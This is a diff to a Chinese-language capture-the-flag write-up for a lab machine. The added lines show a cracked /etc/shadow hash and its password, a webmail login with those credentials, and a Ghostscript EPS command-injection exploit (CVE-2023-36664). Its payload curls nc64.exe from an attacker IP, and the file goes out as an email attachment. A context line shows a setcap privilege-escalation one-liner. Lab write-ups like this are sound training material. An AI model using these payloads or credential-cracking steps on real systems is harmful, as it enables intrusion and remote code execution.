@@ -541,11 +541,23 @@ unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/pyt
 ![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240406222712.png)
 
 当前靶机是window,这台是wsl,需要横向
+查看/etc/shadow得到
+`drwilliams:$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1      tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:19612:0:99999:7:::`
+使用hashcat得到密码
+`qwe123!@#`
 
 - 443
 Hospital Webmail
-`Roundcube Webmail` 这个框架
+`Roundcube Webmail` 这个框架 
+使用上面得到的账号密码 `drwilliams`/`qwe123!@#`登录
 
+有个人发来一封邮件要我们写一个ghost脚本文件(基于adobe,postscript及pdf的界面描述语言),后缀为eps
+可以在eps文件里进行命令注入
+使用这个[项目](https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection)
+```bash
+python3 CVE_2023_36664_exploit.py --inject --payload "curl 10.10.16.37:8000/nc64.exe -o nc64.exe" --filename file.eps
+```
+回复邮件,附带这个eps文件
 
 ### Pov
 #### user
